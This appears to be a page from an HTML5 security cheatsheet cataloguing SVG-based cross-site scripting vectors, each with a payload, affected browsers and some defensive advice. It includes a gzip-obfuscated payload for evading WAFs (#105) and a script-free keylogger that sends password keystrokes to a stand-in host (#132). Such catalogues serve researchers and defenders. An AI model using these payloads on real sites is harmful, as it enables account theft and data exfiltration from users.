<h3 id="SVG_file_executing_JavaScript_via_&lt;SCRIPT&gt;_tag#47test">SVG file executing JavaScript via &lt;SCRIPT&gt; tag<a href="#47">#47</a><a href="test/#47">test</a></h3><p>SVG files can force the user agent to execute JavaScript via plain &lt;SCRIPT&gt; tags inside any SVG element without user interaction</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<p>SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements</p>
<ul>
<li>opera 10.x</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>firefox 3.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>script</li>
<li>opera</li>
<li>firefox</li>
<li>chrome</li>
<li>internet explorer</li>
</ul>
<p>reporter：Romain</p>
<h3 id="SVG_element_allows_automatic_execution_of_onload_attribute_without_other_SVG_elements-#65test">SVG element allows automatic execution of onload attribute without other SVG elements.<a href="#65">#65</a><a href="test/#65">test</a></h3><p>SVG tags allow code to be executed with onload without any other elements. This makes for a very short and effective XSS vector, useful in many situations.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg onload=&#34;javascript:alert(1)&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62;&#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<p>Not really a bug to fix, this is desired behaviour and only increases XSS scope.</p>
<ul>
<li>chrome 4.0</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.4</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>firefox 2.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>onload</li>
<li>chrome</li>
<li>firefox</li>
<li>safari</li>
<li><p>opera</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVG11/attindex.html" target="_blank" rel="external">http://www.w3.org/TR/SVG11/attindex.html</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVGTiny12/attributeTable.html" target="_blank" rel="external">http://www.w3.org/TR/SVGTiny12/attributeTable.html</a></li>
</ul>
<p>reporter：gareth</p>
<h3 id="SVG_simple_passive_JavaScript_execution_via_XLink#87test">SVG simple passive JavaScript execution via XLink<a href="#87">#87</a><a href="test/#87">test</a></h3><p>Browsers that support SVG, forced to support XLink. The parameter of the attribute “xlink:actuate” for &lt;a&gt; tag is fixed - “onRequest”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;a xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; xlink:href=&#34;javascript:alert(1)&#34;&#62;&#60;rect width=&#34;1000&#34; height=&#34;1000&#34; fill=&#34;white&#34;/&#62;&#60;/a&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 4.0</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.4</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>firefox 3.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>passive</li>
<li>xlink</li>
<li>chrome</li>
<li>firefox</li>
<li>safari</li>
<li><p>opera</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVG11/linking.html" target="_blank" rel="external">http://www.w3.org/TR/SVG11/linking.html</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVGTiny12/linking.html" target="_blank" rel="external">http://www.w3.org/TR/SVGTiny12/linking.html</a></li>
<li><a href="#68">#68</a></li>
<li><a href="#81">#81</a></li>
<li><a href="#130">#130</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="SVG_active_JavaScript_execution_via_XLink_in_Opera#88test">SVG active JavaScript execution via XLink in Opera<a href="#88">#88</a><a href="test/#88">test</a></h3><p>The content of the xml-links will be automatically included in the current document. The combination of “onLoad” (value of xlink:actuate) and “embed” (value of xlink:show) forms of potentially unsafe SVG-elements.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34;&#62; &#60;animation xlink:href=&#34;javascript:alert(1)&#34;/&#62; &#60;animation xlink:href=&#34;data:text/xml,%3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; onload=&#39;alert(1)&#39;%3E%3C/svg%3E&#34;/&#62; &#60;image xlink:href=&#34;data:image/svg+xml,%3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; onload=&#39;alert(1)&#39;%3E%3C/svg%3E&#34;/&#62; &#60;foreignObject xlink:href=&#34;javascript:alert(1)&#34;/&#62; &#60;foreignObject xlink:href=&#34;data:text/xml,%3Cscript xmlns=&#39;http://www.w3.org/1999/xhtml&#39;%3Ealert(1)%3C/script%3E&#34;/&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 9.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>active</li>
<li>xlink</li>
<li><p>opera</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVG11/attindex.html" target="_blank" rel="external">http://www.w3.org/TR/SVG11/attindex.html</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVGTiny12/attributeTable.html" target="_blank" rel="external">http://www.w3.org/TR/SVGTiny12/attributeTable.html</a></li>
<li><a href="#95">#95</a></li>
<li><a href="#129">#129</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="SVG_event_handler_injection_via_“set”_and_“animate”#89test">SVG event handler injection via “set” and “animate”<a href="#89">#89</a><a href="test/#89">test</a></h3><p>Google Chrome and Safari support binding an event handler using the elements &lt;set&gt; or &lt;animate&gt;. The attribute value is the actually bound event while the “to” attribute value holds the payload. The problem has been fixed in recent Chrome versions.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;set attributeName=&#34;onmouseover&#34; to=&#34;alert(1)&#34;/&#62; &#60;animate attributeName=&#34;onunload&#34; to=&#34;alert(1)&#34;/&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 4.0</li>
<li><p>chrome 10.0</p>
</li>
<li><p>safari 3.4</p>
</li>
<li><p>safari 4.0.3</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>event</li>
<li>safari</li>
<li><p>chrome</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVG11/animate.html" target="_blank" rel="external">http://www.w3.org/TR/SVG11/animate.html</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVGMobile12/animate.html" target="_blank" rel="external">http://www.w3.org/TR/SVGMobile12/animate.html</a></li>
<li><a href="#24">#24</a></li>
<li><a href="#28">#28</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Using_SVG_element_&lt;handler&gt;#94test">Using SVG element &lt;handler&gt;<a href="#94">#94</a><a href="test/#94">test</a></h3><p>Specification SVG Tiny 1.2 provides an element &lt;handler&gt;, which is a “bridge” between SVG and XML-events. This element can contain regular JavaScript.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;handler xmlns:ev=&#34;http://www.w3.org/2001/xml-events&#34; ev:event=&#34;load&#34;&#62;alert(1)&#60;/handler&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>opera</li>
<li><p>XML-events</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVGMobile12/script.html#HandlerElement" target="_blank" rel="external">http://www.w3.org/TR/SVGMobile12/script.html#HandlerElement</a></p>
</li>
<li><a href="http://www.w3.org/TR/xml-events/" target="_blank" rel="external">http://www.w3.org/TR/xml-events/</a></li>
<li><a href="#85">#85</a></li>
<li><a href="#104">#104</a></li>
<li><a href="#127">#127</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Using_SVG_element_&lt;feImage&gt;_and_animated_data_URIs#95test">Using SVG element &lt;feImage&gt; and animated data URIs<a href="#95">#95</a><a href="test/#95">test</a></h3><p>SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it’s possible to execute JavaScript without user interaction. List all of the elements which can be animated can be found in the specified documentation.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34;&#62; &#60;feImage&#62; &#60;set attributeName=&#34;xlink:href&#34; to=&#34;data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D&#34;/&#62; &#60;/feImage&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.</p>
<ul>
<li>opera 10.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>opera</li>
<li>filter effects</li>
<li><p>feimage</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVG/filters.html" target="_blank" rel="external">http://www.w3.org/TR/SVG/filters.html</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVG11/animate.html#Animatable" target="_blank" rel="external">http://www.w3.org/TR/SVG11/animate.html#Animatable</a></li>
<li><a href="http://www.w3.org/TR/SVGMobile12/animate.html#Animatable" target="_blank" rel="external">http://www.w3.org/TR/SVGMobile12/animate.html#Animatable</a></li>
<li><a href="#88">#88</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Executing_JavaScript_in_SVG_Tiny_1-2_without_user_interaction#104test">Executing JavaScript in SVG Tiny 1.2 without user interaction<a href="#104">#104</a><a href="test/#104">test</a></h3><p>Opera - providing advanced support for SVG Tiny 1.2 targeting mobile devices - allows to execute JavaScript without user interaction via arbitrary tags. The tag is being applied with a handler pointing to a data URI containing the actual handler. Important is the hash at the end of the data URI to identify the corrrect handler. It is also possible to refer to an element contained in the SVG by its ID or an external resource.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; id=&#34;foo&#34;&#62; &#60;x xmlns=&#34;http://www.w3.org/2001/xml-events&#34; event=&#34;load&#34; observer=&#34;foo&#34; handler=&#34;data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg&#8230;Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar&#34;/&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>svg</li>
<li>tinysvg</li>
<li>listener</li>
<li>xml</li>
<li><p>events</p>
</li>
<li><p><a href="http://www.w3.org/TR/SVGMobile12/script.html" target="_blank" rel="external">http://www.w3.org/TR/SVGMobile12/script.html</a></p>
</li>
<li><a href="http://www.w3.org/TR/2003/REC-xml-events-20031014/" target="_blank" rel="external">http://www.w3.org/TR/2003/REC-xml-events-20031014/</a></li>
<li><a href="#85">#85</a></li>
<li><a href="#94">#94</a></li>
<li><a href="#127">#127</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="SVG_payload_obfuscation_with_gzipped_HTML_and_MIME_type_image/svg-xml#105test">SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml<a href="#105">#105</a><a href="test/#105">test</a></h3><p>Opera allows displaying compressed SVG images without the usually necessary encoding header. This works for almost arbitrary data as long as the content type image/svg+xml is set - or image/svg-xml like in this example. Notice that the compressed data can be truncated. Opera will still accept it and render the &lt;script&gt; tag and execute the alert(1) - most other Gzip parsers will break though - rendering any WAF or similar tool trying to analyze the payload useless (gzip 1.3.12 states the payload contains 50+ MB of binary gibberish). The example contains no actual SVG code - just a regular &lt;script&gt; tag with a XHTML namespace attribute.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe src=&#34;data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9&#8230;D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03&#34;&#62;&#60;/iframe&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>svg</li>
<li>svgz</li>
<li>gzip</li>
<li>xml</li>
<li><p>compression</p>
</li>
<li><p><a href="http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html" target="_blank" rel="external">http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Passive_SVG_JavaScript_execution_via_style_injection_(1)_#109test">Passive SVG JavaScript execution via style injection (1) <a href="#109">#109</a><a href="test/#109">test</a></h3><p>SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;a id=&#34;x&#34;&#62;&#60;rect fill=&#34;white&#34; width=&#34;1000&#34; height=&#34;1000&#34;/&#62;&#60;/a&#62; &#60;rect fill=&#34;white&#34; style=&#34;clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);&#34;/&#62; &#60;/svg&#62;``&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34;&#62; &#60;clipPath id=&#34;a&#34; &#62; &#60;set xlink:href=&#34;#x&#34; attributeName=&#34;xlink:href&#34; begin=&#34;1s&#34; to=&#34;javascript:alert(1)&#34; /&#62; &#60;/clipPath&#62; &#60;pattern id=&#34;b&#34;&#62; &#60;set xlink:href=&#34;#x&#34; attributeName=&#34;xlink:href&#34; begin=&#34;2s&#34; to=&#34;javascript:alert(2)&#34; /&#62; &#60;/pattern&#62; &#60;filter id=&#34;c&#34;&#62; &#60;set xlink:href=&#34;#x&#34; attributeName=&#34;xlink:href&#34; begin=&#34;3s&#34; to=&#34;javascript:alert(3)&#34; /&#62; &#60;/filter&#62; &#60;marker id=&#34;d&#34;&#62; &#60;set xlink:href=&#34;#x&#34; attributeName=&#34;xlink:href&#34; begin=&#34;4s&#34; to=&#34;javascript:alert(1)&#34; /&#62; &#60;/marker&#62; &#60;mask id=&#34;e&#34;&#62; &#60;set xlink:href=&#34;#x&#34; attributeName=&#34;xlink:href&#34; begin=&#34;5s&#34; to=&#34;javascript:alert(2)&#34; /&#62; &#60;/mask&#62; &#60;linearGradient id=&#34;f&#34;&#62; &#60;set xlink:href=&#34;#x&#34; attributeName=&#34;xlink:href&#34; begin=&#34;6s&#34; to=&#34;javascript:alert(3)&#34; /&#62; &#60;/linearGradient&#62; &#60;/svg&#62;required_mime: image/svg+xmlcrossdomain: 1path: [http://html5sec.org/test3.svg](http://html5sec.org/test3.svg)name: test3.svg</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>svg</li>
<li>css</li>
<li>xml</li>
<li><p>style</p>
</li>
<li><p><a href="#129">#129</a></p>
</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Passive_SVG_JavaScript_execution_via_style_injection_(2)#110test">Passive SVG JavaScript execution via style injection (2)<a href="#110">#110</a><a href="test/#110">test</a></h3><p>This example shows how SVG markers allow insertion of external links with JavaScript URI into the current document.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;path d=&#34;M0,0&#34; style=&#34;marker-start:url(test4.svg#a)&#34;/&#62; &#60;/svg&#62;``&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34;&#62; &#60;marker id=&#34;a&#34; markerWidth=&#34;1000&#34; markerHeight=&#34;1000&#34; refX=&#34;0&#34; refY=&#34;0&#34;&#62; &#60;a xlink:href=&#34;http://google.com&#34;&#62; &#60;set attributeName=&#34;xlink:href&#34; to=&#34;javascript:alert(1)&#34; begin=&#34;1s&#34; /&#62; &#60;rect width=&#34;1000&#34; height=&#34;1000&#34; fill=&#34;white&#34;/&#62; &#60;/a&#62; &#60;/marker&#62; &#60;/svg&#62;required_mime: image/svg+xmlcrossdomain: 1path: [http://html5sec.org/test4.svg](http://html5sec.org/test4.svg)name: test4.svg</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.x</li>
<li><p>opera 11.52</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>svg</li>
<li>css</li>
<li>xml</li>
<li>style</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="SVG_chameleon_behavior_via_embedded_XSLT#125test">SVG chameleon behavior via embedded XSLT<a href="#125">#125</a><a href="test/#125">test</a></h3><p>This SVG chameleon file can be embedded via &lt;embed&gt; on most, and via &lt;img&gt; on most modern browsers. Thanks to the embedded XSLT stylesheet, it will change it’s appearance, depending on how it is embedded or displayed. In an &lt;img&gt; tag it just shows a red dot. But opened directly or via an &lt;iframe&gt; or &lt;embed&gt;, the XSLT turns all SVG into (X)HTML and an alert will show. While most modern browsers show this behavior, Opera will completely mess it up, and show an alert when used via &lt;embed&gt; and an &lt;iframe&gt; when used via &lt;img&gt; (!). Chrome will show a broken image and an alert.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml version=&#34;1.0&#34;?&#62; &#60;?xml-stylesheet type=&#34;text/xml&#34; href=&#34;#stylesheet&#34;?&#62; &#60;!DOCTYPE doc [ &#60;!ATTLIST xsl:stylesheet id ID #REQUIRED&#62;]&#62; &#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;xsl:stylesheet id=&#34;stylesheet&#34; version=&#34;1.0&#34; xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34;&#62; &#60;xsl:template match=&#34;/&#34;&#62; &#60;iframe xmlns=&#34;http://www.w3.org/1999/xhtml&#34; src=&#34;javascript:alert(1)&#34;&#62;&#60;/iframe&#62; &#60;/xsl:template&#62; &#60;/xsl:stylesheet&#62; &#60;circle fill=&#34;red&#34; r=&#34;40&#34;&#62;&#60;/circle&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 9.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>firefox 3.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>svg</p>
</li>
<li>html</li>
<li>chameleon</li>
<li>xslt</li>
<li>embedded</li>
<li><p>xss</p>
</li>
<li><p><a href="http://www.w3.org/Graphics/SVG/" target="_blank" rel="external">http://www.w3.org/Graphics/SVG/</a></p>
</li>
<li><a href="http://www.w3.org/TR/xslt" target="_blank" rel="external">http://www.w3.org/TR/xslt</a></li>
<li><a href="http://www.dpawson.co.uk/xsl/sect2/onefile.html" target="_blank" rel="external">http://www.dpawson.co.uk/xsl/sect2/onefile.html</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera中通过listener执行JavaScript代码#127test">Opera中通过listener执行JavaScript代码<a href="#127">#127</a><a href="test/#127">test</a></h3><p>示例向量，与#94相关，展示了listener标签和handler标签的组合是如何被利用，从SVG元素中加载事件去触发JavaScript，使其执行。到目前为止，只有Opera支持XML事件和相关元素。不需要用户交互即可执行JavaScript语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; id=&#34;x&#34;&#62; &#60;listener event=&#34;load&#34; handler=&#34;#y&#34; xmlns=&#34;http://www.w3.org/2001/xml-events&#34; observer=&#34;x&#34;/&#62; &#60;handler id=&#34;y&#34;&#62;alert(1)&#60;/handler&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 9.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>svg</p>
</li>
<li>opera</li>
<li>xml</li>
<li>events</li>
<li>listener</li>
<li>handler</li>
<li><p>xss</p>
</li>
<li><p><a href="http://www.opera.com/docs/specs/presto29/svg/elements/" target="_blank" rel="external">http://www.opera.com/docs/specs/presto29/svg/elements/</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVGMobile12/script.html#ListenerElement" target="_blank" rel="external">http://www.w3.org/TR/SVGMobile12/script.html#ListenerElement</a></li>
<li><a href="http://www.w3.org/TR/2010/NOTE-xml-events2-20101216/Overview.html#section-eventhandlers" target="_blank" rel="external">http://www.w3.org/TR/2010/NOTE-xml-events2-20101216/Overview.html#section-eventhandlers</a></li>
<li><a href="#85">#85</a></li>
<li><a href="#94">#94</a></li>
<li><a href="#104">#104</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Firefox_解析SVG中被编码的HTML实体#128test">Firefox 解析SVG中被编码的HTML实体<a href="#128">#128</a><a href="test/#128">test</a></h3><p>Firefox 4允许HTML实体被用在纯文本标签中去表示他们原有的含义，例如style，nostyle，noframes和其他标签。尽管HTML已经被编码，但是这一特性仍有可能导致绕过过滤，特别是在内联SVG和innerHTML的拷贝被使用时。这一bug已在最新的Firefox中修复。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg&#62;&#60;style&#62;&#38;lt;img/src=x onerror=alert(1)// &#60;/b&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>firefox 4.0</p>
</li>
<li><p>svg</p>
</li>
<li>xss</li>
<li>inline</li>
<li>entities</li>
<li>firefox</li>
<li>css</li>
<li>xml</li>
<li><p>innerhtml</p>
</li>
<li><p><a href="http://www.mozilla.org/security/announce/2011/mfsa2011-27.html" target="_blank" rel="external">http://www.mozilla.org/security/announce/2011/mfsa2011-27.html</a></p>
</li>
<li><a href="https://developer.mozilla.org/en/svg_in_html_introduction" target="_blank" rel="external">https://developer.mozilla.org/en/svg_in_html_introduction</a></li>
<li><a href="#59">#59</a></li>
<li><a href="#97">#97</a></li>
<li><a href="#98">#98</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera_active_JavaScript_execution_via_STYLE_in_SVG#129test">Opera active JavaScript execution via STYLE in SVG<a href="#129">#129</a><a href="test/#129">test</a></h3><p>Additional to script execution via “xlink:href” in SVG elements such as &lt;image&gt;, &lt;animation&gt;, &lt;foreignObject&gt;, Opera 11 allows to utilize filters (as well as other CSS properties listed in #109) to accomplish the same. Note that either these CSS properties, as well as the analogous attributes (the filter attribute in particular) can be used in this case. Both style and analogous attributes in inline SVG should be considered unsafe.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg&#62; &#60;image style=&#39;filter:url(&#34;data:image/svg+xml,&#60;svg xmlns=%22http://www.w3.org/2000/svg%22&#62;&#60;script&#62;parent.alert(1)&#60;/script&#62;&#60;/svg&#62;&#34;)&#39;&#62; &#60;!-- Same effect with &#60;image filter=&#39;...&#39;&#62; --&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<p>Do not allow style and filter attributes inside user generated SVG data. It’s considerably the best to generally avoid user generated SVG data - if possible.</p>
<ul>
<li>opera 11.60</li>
<li><p>opera 12.0</p>
</li>
<li><p>svg</p>
</li>
<li>xss</li>
<li>inline</li>
<li>opera</li>
<li>css</li>
<li><p>style</p>
</li>
<li><p><a href="#88">#88</a></p>
</li>
<li><a href="#109">#109</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="SVG_&lt;set&gt;_and_&lt;animate&gt;_elements_allow_key-logging_w/o_JavaScript#132test">SVG &lt;set&gt; and &lt;animate&gt; elements allow key-logging w/o JavaScript<a href="#132">#132</a><a href="test/#132">test</a></h3><p>It is possible to achieve an injection capable to exfiltrate keyboard events without any JavaScript execution via SVG and set/animate timing attributes. In essence, an access key can be specified to trigger events inside an SVG. In case an inline SVG is being used, the listener for these keys observes the whole document - and not just the SVG itself. This means that even keystrokes into a form input trigger the SVG access key handler. Once this access key handler is being combined with adding a new keystroke-depending image source to an existing image, the form input will be filled, and the SVG will reset a hidden image source according to the key being pressed and thereby silently exfiltrate the data. Since all this works without using any JavaScript, it was also possible to execute this attack in latest Thunderbird versions - with the vector invisibly wrapped inside the mail-body. The problem has been reported and fixed, CVE-2011-3663 has been assigned. Current stable versions of Firefox still allow to observe the problem - using a network traffic monitor/Firebug is recommended.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!doctype html&#62; &#60;form&#62; &#60;label&#62;type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)&#60;/label&#62; &#60;br&#62; &#60;input name=&#34;secret&#34; type=&#34;password&#34;&#62; &#60;/form&#62; &#60;!-- injection --&#62;&#60;svg height=&#34;50px&#34;&#62; &#60;image xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34;&#62; &#60;set attributeName=&#34;xlink:href&#34; begin=&#34;accessKey(a)&#34; to=&#34;//example.com/?a&#34; /&#62; &#60;set attributeName=&#34;xlink:href&#34; begin=&#34;accessKey(b)&#34; to=&#34;//example.com/?b&#34; /&#62; &#60;set attributeName=&#34;xlink:href&#34; begin=&#34;accessKey(c)&#34; to=&#34;//example.com/?c&#34; /&#62; &#60;set attributeName=&#34;xlink:href&#34; begin=&#34;accessKey(d)&#34; to=&#34;//example.com/?d&#34; /&#62; &#60;/image&#62; &#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 4</li>
<li><p>firefox latest</p>
</li>
<li><p>svg</p>
</li>
<li>html5</li>
<li>noscript</li>
<li>keylogger</li>
<li>firefox</li>
<li><p>thunderbird</p>
</li>
<li><p><a href="http://www.mozilla.org/security/announce/2011/mfsa2011-56.html" target="_blank" rel="external">http://www.mozilla.org/security/announce/2011/mfsa2011-56.html</a></p>
</li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=704482" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=704482</a></li>
<li><a href="http://www.w3.org/TR/SVG/animate.html#TimingAttributes" target="_blank" rel="external">http://www.w3.org/TR/SVG/animate.html#TimingAttributes</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Executing_JavaScript_via_“from”_attribute_in_SVG_and_inline-SVG#137test">Executing JavaScript via “from” attribute in SVG and inline-SVG<a href="#137">#137</a><a href="test/#137">test</a></h3><p>It is commonly known, that the &lt;animate&gt; element in combination with the “to” parameter can be used to change existing attributes to potentially active values and cause arbitrary script execution. It is nevertheless also possible to use the “from” attribute for the very same purpose - albeit this being rather counter-intuitive. The given example code snippet describes an SVG containing a circle that encapsulates an &lt;animate&gt; element. This uses the “from” attribute to set the “href” attribute of the link encapsulating the circle to a JavaScript URI. Clicking the circle will execute the JavaScript.</p>
